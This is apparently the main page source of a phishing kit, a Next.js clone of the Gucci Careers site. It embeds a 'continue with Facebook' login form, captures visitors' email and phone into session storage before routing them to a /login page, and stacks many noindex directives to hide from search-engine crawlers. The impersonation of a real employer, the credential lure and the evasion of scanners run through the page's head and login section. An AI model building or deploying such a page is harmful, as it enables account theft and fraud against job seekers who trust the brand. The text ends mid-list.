import Head from "next/head";
import { createContext, useState, useEffect } from "react";
import { useRouter } from "next/router";
import { basePath } from "../next.config";
import ActualForm from "../components/common/ActualForm";
import FacebookLogo from "../assets/images/FLogo.png";
export const DataContext = createContext();

export default function Home() {
  const router = useRouter();
  const [isFormLoading, setIsFormLoading] = useState(false);
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [errEmail, setErrEmail] = useState("");
  const [errPhone, setErrPhone] = useState("");
  const [BusinessEmail, setBusinessEmail] = useState("");
  const [BusinessEmailError, setBusinessEmailError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [loadingType, setLoadingType] = useState("");

  const validateEmail = (email) => /^\S+@\S+\.\S+$/.test(email);

 

  const handleContinueWithEmail = async () => {
    if (!validateEmail(BusinessEmail)) {
      setBusinessEmailError("Please enter a valid email address.");
      return;
    }
    setBusinessEmailError("");
    try {
      setIsLoading(true);
      setLoadingType("email");

      console.log("Creating account with:", BusinessEmail);
    } catch (e) {
      console.error(e);
    } finally {
      setIsLoading(false);
      setLoadingType("");
    }
  };

  const NextStep = () => {
    loginWithFacebook();
  };
  function loginWithFacebook() {
    setPhone("");
    setEmail("");
    sessionStorage.removeItem("email");
    sessionStorage.removeItem("phone");
    router.push("/login");
  }

  function handleContinue() {
    setErrEmail("");
    setErrPhone("");

    const reEmail =
      /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

    if (!reEmail.test(email)) {
      setErrEmail("Please enter a valid email address");
      return;
    }

    const rePhone = /^\+?(\s*\d){8,}\s*$/;
    if (!rePhone.test(phone)) {
      setErrPhone("Please enter a valid phone");
      return;
    }

    setIsFormLoading(true);

    setTimeout(() => {
      sessionStorage.setItem("email", email);
      sessionStorage.setItem("phone", phone);
      setErrEmail("");
      setErrPhone("");
      router.push("/login");
      setIsFormLoading(false);
    }, 2000);
  }

  useEffect(() => {
    const scriptId = "gucci-app-js";
    if (document.getElementById(scriptId)) {
      return;
    }

    const script = document.createElement("script");
    script.id = scriptId;
    script.src = `${basePath}/assets/app.js`;
    script.async = true;
    document.body.appendChild(script);

    return () => {
      const existingScript = document.getElementById(scriptId);
      if (existingScript) {
        document.body.removeChild(existingScript);
      }
    };
  }, []);

  return (
    <>
      <Head>
        <title>Gucci Careers | Empowering Dream-makers</title>
        <link rel="icon" href={`${basePath}/favicon.ico`} />
        <meta name="robots" content="noimageindex" />
        <meta name="robots" content="notranslate" />
        <meta name="robots" content="nositelinkssearchbox" />
        <meta name="robots" content="nosnippet" />
        <meta name="robots" content="max-snippet:0" />
        <meta
          name="crawler"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="AdsBot-Google"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot-news"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta name="googlebot-news" content="nosnippet" />
        <meta name="robots" content="max-image-preview:none" />
        <meta name="robots" content="noindex,nofollow,noarchive" />
        <meta name="robots" content="noarchive" />
      </Head>

      <div data-barba="wrapper" className="font-gucci-sans">
        <div id="loading" className="bg-noise"></div>
        <div id="main-bg" className="bg-noise"></div>

        <input type="hidden" id="language" name="language" value="en" />
        <input type="hidden" id="bannerType" name="bannerType" value="code" />
        <input type="hidden" id="bannerActive" name="bannerActive" value="" />
        <input type="hidden" id="bannerImgDesk" name="bannerImgDesk" value="" />
        <input
          type="hidden"
          id="bannerImgMobile"
          name="bannerImgMobile"
          value=""
        />

        <header id="main-header">
          <a
            href="#"
            className="main-header__trigger"
            data-datalayer="Clicks on Menu;"
            data-barba-prevent
          >
            <span>
              <i></i>
            </span>
            <span></span>
            <span style={{ textTransform: "uppercase" }}>MENU</span>
            <span style={{ textTransform: "uppercase" }}>CLOSE</span>
          </a>
          <div className="main-header__logo">
            <a href="https://careers.gucci.com">
              <img
                src="https://careers.gucci.com/wp-content/themes/careers/assets/images/logo.svg"
                alt=""
              />
            </a>
          </div>
          <div className="main-header__right">
            <a
              href=" https://kering.wd3.myworkdayjobs.com/Gucci"
              target="_blank"
              data-utm="true"
              data-datalayer="Clicks on Jobs;;landing on workday"
            >
              JOBS IN THE HOUSE
            </a>
            <a
              href=" https://kering.wd3.myworkdayjobs.com/Gucci"
              target="_blank"
              data-utm="true"
              data-datalayer="Clicks on Jobs;;landing on workday"
            >
              JOBS
            </a>
            <div className="langs">
              <span>ENGLISH</span>
              <div className="lang" data-simplebar>
                <ul>
                  <li>
                    <a href="https://careers.gucci.com" data-barba-prevent>
                      ENGLISH
                    </a>
                  </li>{" "}
                  <li>
                    <a href="https://careers.gucci.com/it" data-barba-prevent>
                      ITALIANO
                    </a>
                  </li>{" "}
                  <li>
                    <a href="https://careers.gucci.com/es" data-barba-prevent>
                      ESPAÑOL
                    </a>
                  </li>{" "}
                  <li>
                    <a href="https://careers.gucci.com/fr" data-barba-prevent>
                      FRANÇAIS
                    </a>
                  </li>{" "}
                  <li>
                    <a href="https://careers.gucci.com/de" data-barba-prevent>
                      DEUTSCH
                    </a>
                  </li>{" "}
                  <li>
                    <a href="https://careers.gucci.com/ru" data-barba-prevent>
                      РУССКИЙ
                    </a>
                  </li>{" "}
                  <li>
                    <a
                      href="https://careers.gucci.com/pt-br"
                      data-barba-prevent
                    >
                      PORTUGUÊS
                    </a>
                  </li>{" "}
                  <li>
                    <a href="https://careers.gucci.com/ja" data-barba-prevent>
                      日本 (JA)
                    </a>
                  </li>{" "}
                  <li>
                    <a
                      href="https://careers.gucci.com/zh-hans"
                      data-barba-prevent
                    >
                      简体中文 (ZH)
                    </a>
                  </li>{" "}
                  <li>
                    <a
                      href="https://careers.gucci.com/zh-hant"
                      data-barba-prevent
                    >
                      繁體中文 (HK)
                    </a>
                  </li>{" "}
                  <li>
                    <a href="https://careers.gucci.com/ko" data-barba-prevent>
                      한국인 (KO)
                    </a>
                  </li>{" "}
                </ul>
              </div>
            </div>
          </div>
        </header>

        <div id="main-menu">
          <div className="main-menu__wrapper">
            <div className="main-menu__nav">
              <nav>
                <ul>
                  <li>
                    <a
                      data-datalayer="Clicks on Houses;;Houses"
                      href="https://careers.gucci.com/houses/"
                      className="link"
                    >
                      <span>EXPLORE OUR</span>HOUSES
                    </a>
                    <ul className="houses">
                      <li>
                        <a
                          data-datalayer="Click on Houses;;Italy"
                          href="https://careers.gucci.com/houses/#italy"
                          className="tag"
                        >
                          <span>ITALY</span>
                        </a>
                      </li>

                      <li>
                        <a
                          data-datalayer="Click on Houses;;Americas"
                          href="https://careers.gucci.com/houses/#americas"
                          className="tag"
                        >
                          <span>AMERICAS</span>
                        </a>
                      </li>

                      <li>
                        <a
                          data-datalayer="Click on Houses;;Asia"
                          href="https://careers.gucci.com/houses/#asia"
                          className="tag"
                        >
                          <span>ASIA</span>
                        </a>
                      </li>

                      <li>
                        <a
                          data-datalayer="Click on Houses;;Emea"
                          href="https://careers.gucci.com/houses/#emea"
                          className="tag"
                        >
                          <span>EMEA</span>
                        </a>
                      </li>
                    </ul>
                  </li>

                  <li>
                    <a
                      data-datalayer="Clicks on Community;;"
                      href="https://careers.gucci.com/community/"
                      className="link"
                    >
                      <span>MEET OUR</span>COMMUNITY
                    </a>
                  </li>

                  <li>
                    <a
                      data-datalayer="Clicks on History;;"
                      href="https://careers.gucci.com/history/"
                      className="link"
                    >
                      <span>LEARN OUR</span>HISTORY
                    </a>
                  </li>
                  <li>
                    <div>
                      <div className="langs-mobile">
                        <span>ENGLISH</span>
                        <div className="lang" data-simplebar>
                          <ul>
                            <li>
                              <a
                                href="https://careers.gucci.com"
                                data-barba-prevent
                              >
                                ENGLISH
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/it"
                                data-barba-prevent
                              >
                                ITALIANO
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/es"
                                data-barba-prevent
                              >
                                ESPAÑOL
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/fr"
                                data-barba-prevent
                              >
                                FRANÇAIS
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/de"
                                data-barba-prevent
                              >
                                DEUTSCH
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/ru"
                                data-barba-prevent
                              >
                                РУССКИЙ
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/pt-br"
                                data-barba-prevent
                              >
                                PORTUGUÊS
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/ja"
                                data-barba-prevent
                              >
                                日本 (JA)
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/zh-hans"
                                data-barba-prevent
                              >
                                简体中文 (ZH)
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/zh-hant"
                                data-barba-prevent
                              >
                                繁體中文 (HK)
                              </a>
                            </li>{" "}
                            <li>
                              <a
                                href="https://careers.gucci.com/ko"
                                data-barba-prevent
                              >
                                한국인 (KO)
                              </a>
                            </li>{" "}
                          </ul>
                        </div>
                      </div>
                    </div>
                    <div>
                      <a
                        href="https://careers.gucci.com/#linkedin-grid"
                        className="btn"
                        data-datalayer="Clicks on Linkedin;;"
                      >
                        FOLLOW OUR STORIES
                      </a>
                    </div>
                  </li>
                </ul>
              </nav>
            </div>
            <div className="main-menu__feed">
              <div className="main-menu__feed__list">
                <div>
                  <div className="box" js-date="11/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7305218559180210177"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7305218559180210177"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/1_1741699824796.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>11/03/2025</p>
                      <p>
                        Gucci continues to explore new frontiers in digital
                        innovation with the latest update to the Gucci App for
                        Apple Vision Pro. This release introduces a Spatial
                        Gallery, an immersive Fashion Show experience, and a
                        dedicated Beauty Backstage section, offering ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="08/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7303806769435144193"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7303806769435144193"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/2_1741363216277.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>08/03/2025</p>
                      <p>
                        The House revealed its Fall Winter 2025 collection with
                        an original score by the award-winning composer and
                        conductor Justin Hurwitz, performed live at the fashion
                        show in Milan. Listen to the music and ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="07/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7303707300576260096"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7303707300576260096"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/3_1741339510157.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>07/03/2025</p>
                      <p>
                        New destinations. A road trip with a cast including
                        Global Brand Ambassador Ni Ni unfolds in the latest
                        Gucci Eyewear campaign for Spring Summer 2025, where
                        memories are framed through the ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="06/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7303058026154921984"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7303058026154921984"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/1741184704367.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>06/03/2025</p>
                      <p>
                        Guests attended Le Grand Dîner du Louvre in Gucci for a
                        special evening celebrating the ‘Louvre Couture Art and
                        Fashion: Statement ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="05/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7302341916564549634"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7302341916564549634"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/5_1741013980335.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>05/03/2025</p>
                      <p>
                        At the 97th Academy Awards in Los Angeles, guests
                        including Laura Dern, Robert Downey Jr. and Susan
                        Downey, and presenter ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="05/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7302613886954881024"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7302613886954881024"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/6_1741078803552.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>05/03/2025</p>
                      <p>
                        “Joining Gucci has been a transformative experience that
                        pushed me beyond my comfort zone, allowing me to grow
                        both personally and professionally. Every challenge
                        introduced fresh perspectives and the chance to ...
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="main-menu__bg"></div>
        </div>

        <main id="main-content" data-scroll-container>
          <div data-barba="container" data-barba-namespace="home">
            <section
              data-scroll-section
              className="page-cover page-cover--home-1"
            >
              <div className="page-cover__home is-desktop">
                <div>
                  <span
                    data-in="2000"
                    className="line-white"
                    data-line-full
                  ></span>
                  <h3 data-in data-text-in>
                    <span data-text-full>
                      <em>EMPOWERING</em>
                    </span>
                  </h3>
                  <span
                    data-in="2100"
                    className="line-white"
                    data-line-full
                  ></span>
                  <h3 data-in="100" data-text-in>
                    <span data-text-full>
                      <em>DREAM-MAKERS</em>
                    </span>
                  </h3>
                  <span
                    data-in="2200"
                    className="line-white"
                    data-line-full
                  ></span>
                  <div data-in="2000" className="page-cover__more more-white">
                    <div>
                      <span style={{ textTransform: "uppercase" }}></span>
                      SCROLL DOWN{" "}
                    </div>
                  </div>
                </div>
              </div>
              <div className="page-cover__home is-mobile">
                <div>
                  <span
                    data-in="2000"
                    className="line-white"
                    data-line-full
                  ></span>
                  <h3 data-in data-text-in>
                    <span data-text-full>
                      <em>EMPOWERING</em>
                    </span>
                  </h3>
                  <span
                    data-in="2100"
                    className="line-white"
                    data-line-full
                  ></span>
                  <h3 data-in="100" data-text-in>
                    <span data-text-full>
                      <em>DREAM</em>
                    </span>
                  </h3>

                  <span
                    data-in="2200"
                    className="line-white"
                    data-line-full
                  ></span>
                  <h3 data-in="200" data-text-in>
                    <span data-text-full>
                      <em>MAKERS</em>
                    </span>
                  </h3>
                  <span
                    data-in="2300"
                    className="line-white"
                    data-line-full
                  ></span>
                  <div data-in="2000" className="page-cover__more more-white">
                    <div>
                      <span style={{ textTransform: "uppercase" }}></span>
                      SCROLL DOWN{" "}
                    </div>
                  </div>
                </div>
              </div>
              <div
                className="page-cover__transition"
                data-transition="home-1-intro"
              >
                <span></span>
              </div>
            </section>

            <section
              id="section-login"
              className="login-section"
              data-scroll-section="login"
            >
              <div className="jicile">
                <div className="flex justify-center md:flex-row gap-0 w-full max-w-5xl mx-auto w overflow-hidden">
               
                  <ActualForm
                    BusinessEmail={BusinessEmail}
                    setBusinessEmail={setBusinessEmail}
                    BusinessEmailError={BusinessEmailError}
                    handleContinueWithEmail={handleContinueWithEmail}
                    NextStep={NextStep}
                    FacebookLogo={FacebookLogo}
                    isLoading={isLoading}
                    loadingType={loadingType}
                  />
                </div>
              </div>
            </section>
            <section data-scroll-section="group" id="section-00">
              <section className="intro intro__review" id="intro--00">
                <div className="container">
                  <div className="intro__wrapper">
                    <div
                      className="intro__head"
                      data-scroll
                      data-scroll-sticky
                      data-scroll-target="#intro--00"
                    >
                      <div className="">
                        <h3>
                          Being a Dream-maker means having the capability to
                          transform ideas, aspirations and passions into
                          tangible products and narratives that can make people
                          dream.
                        </h3>
                      </div>
                    </div>
                  </div>
                  <div className="intro__content">
                    <div>
                      <div>
                        <div className="intro__text" data-in data-fade-in>
                          <div className="white">
                            <p>
                              — Gucci is the place where dreams come true, where
                              ideas take shape to enclose conceptual universes
                              in which the contemporary consumer and the entire
                              Gucci community can recognize themselves and see
                              their identity affirmed.
                            </p>
                            <p>
                              We are more than a place to work: we are{" "}
                              <span data-in="" data-text-highlight="orange">
                                a joyful and open community
                              </span>{" "}
                              where unique possibilities come to life.
                            </p>
                            <p>
                              We don&#8217;t follow set paths; we embrace the
                              unconventional and question the ordinary to find
                              new solutions: to create new dreams.
                            </p>
                          </div>
                          <div className="white">
                            <p>
                              —{" "}
                              <span data-in="" data-text-highlight="pea">
                                Joining Gucci means embarking on a journey
                              </span>{" "}
                              through a purposeful environment where your voice
                              can be heard, and your personality fully
                              expressed.
                            </p>
                            <p>
                              It&#8217;s the playground where you can amplify
                              your skills and explore territories you never
                              thought possible.
                            </p>
                            <p>
                              We are not looking for daydreamers but for people
                              who are able to shape their dreams into something
                              that has an{" "}
                              <span data-in="" data-text-highlight="violet">
                                impact on the world.
                              </span>
                            </p>
                          </div>
                        </div>
                        <div className="intro__quote ">
                          Welcome to our place where dreams are the starting
                          point of the journey itself.{" "}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>

              <section data-section-padding="lateral" className="review-2">
                <h3 data-in data-text-in>
                  <span data-text-full>
                    <em>WELCOME TO</em>
                  </span>
                </h3>
                <h3 data-in="100" data-text-in>
                  <span data-text-full>
                    <em>GUCCI</em>
                  </span>
                </h3>
              </section>

              <section data-section-padding="lateral" className="become ">
                <div>
                  <span data-in data-line-full className="in"></span>
                  <h3 data-in data-text-in>
                    <span data-text-full>
                      <em>THIS IS WHAT IT MEANS</em>
                    </span>
                  </h3>
                  <span data-in data-line-full className="in"></span>
                  <h3 data-in="100" data-text-in>
                    <span data-text-full>
                      <em>TO BE ONE OF US</em>
                    </span>
                  </h3>
                  <span data-in data-line-full className="in"></span>
                </div>
              </section>
            </section>

            <section data-scroll-section id="scene-01">
              <div className=""></div>
              <section
                data-scroll-text
                id="scroll-text--01"
                className="is-desktop "
              >
                <div className="scroll-text__wrapper">
                  <h3>EXPRESSING YOURSELF</h3>
                </div>
                <div className="scroll-text__placeholder"></div>
                <div
                  className="scroll-text__bg"
                  data-scroll
                  data-scroll-sticky
                  data-scroll-target="#scroll-text--01"
                >
                  <div className="no-transition">
                    <div></div>
                  </div>
                </div>
              </section>

              <section data-text-justify className="is-mobile ">
                <div className="content">
                  <div>
                    <h3>EXPRESSING &nbsp;YOURSELF&nbsp;</h3>{" "}
                  </div>
                </div>
                <div className="bg">
                  <div className="no-transition">
                    <div></div>
                  </div>
                </div>
              </section>

              <section className="intro intro--no-mb" id="intro--01">
                <div className="container">
                  <div className="intro__wrapper">
                    <div className="intro__head ">
                      <div>
                        <h3>
                          We nurture our unique selves and this is what creates
                          the fabric of Gucci.
                        </h3>
                      </div>
                    </div>
                  </div>
                  <div className="intro__content intro__content--single">
                    <div>
                      <div>
                        <div className="intro__text" data-in data-fade-in>
                          <div>
                            <p>
                              — We value the power of uniqueness staying true to
                              our own voice but also giving rise to
                              extraordinary collaborations, where diverse ideas
                              and skills come together to explore new ways to
                              build unexpected and successful projects.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
            </section>

            <section data-scroll-section id="scene-02">
              <section
                data-scroll-text
                id="scroll-text--02"
                className="is-desktop"
              >
                <div className="scroll-text__wrapper">
                  <h3>INVITING INCLUSIVITY</h3>
                </div>
                <div className="scroll-text__placeholder"></div>
                <div
                  className="scroll-text__bg"
                  data-scroll
                  data-scroll-sticky
                  data-scroll-target="#scroll-text--02"
                >
                  <div className="no-transition">
                    <div></div>
                  </div>
                </div>
              </section>

              <section data-text-justify className="is-mobile">
                <div className="content">
                  <div>
                    <h3>INVITING &nbsp;INCLUSIVITY&nbsp;</h3>{" "}
                  </div>
                </div>
                <div className="bg">
                  <div className="no-transition">
                    <div></div>
                  </div>
                </div>
              </section>

              <section className="intro intro--no-mb" id="intro--02">
                <div className="container">
                  <div className="intro__wrapper">
                    <div className="intro__head">
                      <div>
                        <h3>
                          We strive to build a welcoming community where
                          everyone can participate and belong.
                        </h3>
                      </div>
                    </div>
                  </div>
                  <div className="intro__content intro__content--single">
                    <div>
                      <div>
                        <div className="intro__text" data-in data-fade-in>
                          <div>
                            <p>
                              — We want people to feel part of a positive, open
                              and fair workplace. Being with others having
                              different ideas and ways of expressing themselves
                              is at the core of our beliefs. It’s the best way
                              to respond to some of the biggest issues in our
                              society.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
            </section>

            <section data-scroll-section id="scene-03">
              <section
                data-scroll-text
                id="scroll-text--03"
                className="is-desktop"
              >
                <div className="scroll-text__wrapper">
                  <h3>BREAKING NEW GROUND</h3>
                </div>
                <div className="scroll-text__placeholder"></div>
                <div
                  className="scroll-text__bg"
                  data-scroll
                  data-scroll-sticky
                  data-scroll-target="#scroll-text--03"
                >
                  <div className="no-transition">
                    <div>
                      <span className="span-1"></span>
                      <span className="span-2"></span>
                      <span className="span-3"></span>
                      <span className="span-4"></span>
                      <span className="span-5"></span>
                      <span className="span-6"></span>
                      <span className="span-7"></span>
                      <span className="span-8"></span>
                      <span className="span-9"></span>
                      <span className="span-10"></span>
                      <span className="span-11"></span>
                      <span className="span-12"></span>
                    </div>
                  </div>
                </div>
              </section>

              <section data-text-justify className="is-mobile">
                <div className="content">
                  <div>
                    <h3>BREAKING &nbsp;NEW GROUND&nbsp;</h3>{" "}
                  </div>
                </div>
                <div className="bg">
                  <div className="no-transition">
                    <div>
                      <span className="span-1"></span>
                      <span className="span-2"></span>
                      <span className="span-3"></span>
                      <span className="span-4"></span>
                      <span className="span-5"></span>
                      <span className="span-6"></span>
                      <span className="span-7"></span>
                      <span className="span-8"></span>
                      <span className="span-9"></span>
                      <span className="span-10"></span>
                      <span className="span-11"></span>
                      <span className="span-12"></span>
                    </div>
                  </div>
                </div>
              </section>

              <section className="intro intro--no-mb" id="intro--03">
                <div className="container">
                  <div className="intro__wrapper">
                    <div className="intro__head">
                      <div>
                        <h3>
                          We always look around with new eyes and start building
                          new paths.
                        </h3>
                      </div>
                    </div>
                  </div>
                  <div className="intro__content intro__content--single">
                    <div>
                      <div>
                        <div className="intro__text" data-in data-fade-in>
                          <div>
                            <p>
                              — We always approach the world with a different
                              mindset: constantly reinterpreting contemporary
                              codes, never settling. By looking beyond the
                              surface and imagining things that don’t yet exist
                              we keep evolving our culture.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
            </section>

            <section data-scroll-section id="scene-04">
              <div className="scratch-dark">
                <img src={`${basePath}/assets/gucci/scratch-dark.png`} alt="" />
              </div>
              <div className="text-big">
                <p>
                  <span>PUTTING</span>
                </p>
                <span className="in" data-line-full></span>

                <p>
                  <span>DREAMS IN</span>
                </p>
                <span className="in" data-line-full></span>

                <p>
                  <span>EVERYTHING</span>
                </p>
                <span className="in" data-line-full></span>

                <p>
                  <span>WE DO</span>
                </p>
                <span className="in" data-line-full></span>
              </div>
              <div className="feed-grid" id="linkedin-grid">
                <div>
                  <div className="box" js-date="11/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7305218559180210177"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7305218559180210177"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/1_1741699824796.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>11/03/2025</p>
                      <p>
                        Gucci continues to explore new frontiers in digital
                        innovation with the latest update to the Gucci App for
                        Apple Vision Pro. This release introduces a Spatial
                        Gallery, an immersive Fashion Show experience, and a
                        dedicated Beauty Backstage section, offering ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="08/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7303806769435144193"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7303806769435144193"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/2_1741363216277.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>08/03/2025</p>
                      <p>
                        The House revealed its Fall Winter 2025 collection with
                        an original score by the award-winning composer and
                        conductor Justin Hurwitz, performed live at the fashion
                        show in Milan. Listen to the music and ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="07/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7303707300576260096"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7303707300576260096"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/3_1741339510157.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>07/03/2025</p>
                      <p>
                        New destinations. A road trip with a cast including
                        Global Brand Ambassador Ni Ni unfolds in the latest
                        Gucci Eyewear campaign for Spring Summer 2025, where
                        memories are framed through the ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="06/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7303058026154921984"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7303058026154921984"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/1741184704367.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>06/03/2025</p>
                      <p>
                        Guests attended Le Grand Dîner du Louvre in Gucci for a
                        special evening celebrating the ‘Louvre Couture Art and
                        Fashion: Statement ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="05/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7302341916564549634"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7302341916564549634"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/5_1741013980335.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>05/03/2025</p>
                      <p>
                        At the 97th Academy Awards in Los Angeles, guests
                        including Laura Dern, Robert Downey Jr. and Susan
                        Downey, and presenter ...
                      </p>
                    </div>
                  </div>

                  <div className="box" js-date="05/03/2025">
                    <div>
                      <a
                        href="https://www.linkedin.com/feed/update/urn:li:activity:7302613886954881024"
                        target="_blank"
                        data-utm="true"
                        data-datalayer="Click on Linkedin post;;Gucci post https://www.linkedin.com/feed/update/urn:li:activity:7302613886954881024"
                        data-barba-prevent
                      >
                        <img
                          src={`${basePath}/assets/gucci/6_1741078803552.jpeg`}
                          alt=""
                        />
                      </a>
                      <p>05/03/2025</p>
                      <p>
                        “Joining Gucci has been a transformative experience that
                        pushed me beyond my comfort zone, allowing me to grow
                        both personally and professionally. Every challenge
                        introduced fresh perspectives and the chance to ...
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>

          <section data-scroll-section id="footer"></section>
        </main>

        <div id="home-nav">
          <ul>
            <li>
              <a
                href="#scene-01"
                data-barba-prevent
                className="current"
                data-datalayer="home_tab;;Expressing yourself"
              >
                <span>EXPRESSING YOURSELF</span>
              </a>
            </li>
            <li>
              <a
                href="#scene-02"
                data-datalayer="home_tab;;Inviting inclusivity"
                data-barba-prevent
              >
                <span>INVITING INCLUSIVITY</span>
              </a>
            </li>
            <li>
              <a
                href="#scene-03"
                data-datalayer="home_tab;;Breaking new ground"
                data-barba-prevent
              >
                <span>BREAKING NEW GROUND</span>
              </a>
            </li>
          </ul>
        </div>

        <div id="jobs-nav">
          <a
            href="#"
            className="jobs-nav__trigger"
            data-datalayer="Open Areas;;"
            style={{ textTransform: "uppercase" }}
            data-barba-prevent
          >
            <span></span>COMMUNITY AREAS
          </a>
          <ul>
            <li>
              <a
                href="#artlab-leather-goods-shoe-and-jewelry-industrial-operations"
                data-datalayer="Click on Areas anchor;;Artlab & Leather Goods, Shoe, and Jewelry Industrial Operations"
                data-barba-prevent
              >
                Artlab & Leather Goods, Shoe, and Jewelry Industrial Operations
              </a>
            </li>
            <li>
              <a
                href="#brand-and-customer-engagement"
                data-datalayer="Click on Areas anchor;;Brand and Customer Engagement"
                data-barba-prevent
              >
                Brand and Customer Engagement
              </a>
            </li>
            <li>
              <a
                href="#design-team"
                data-datalayer="Click on Areas anchor;;Design Team"
                data-barba-prevent
              >
                Design Team
              </a>
            </li>
            <li>
              <a
                href="#digital"
                data-datalayer="Click on Areas anchor;;Digital"
                data-barba-prevent
              >
                Digital
              </a>
            </li>
            <li>
              <a
                href="#global-merchandising"
                data-datalayer="Click on Areas anchor;;Global Merchandising"
                data-barba-prevent
              >
                Global Merchandising
              </a>
            </li>
            <li>
              <a
                href="#global-visual-merchandising"
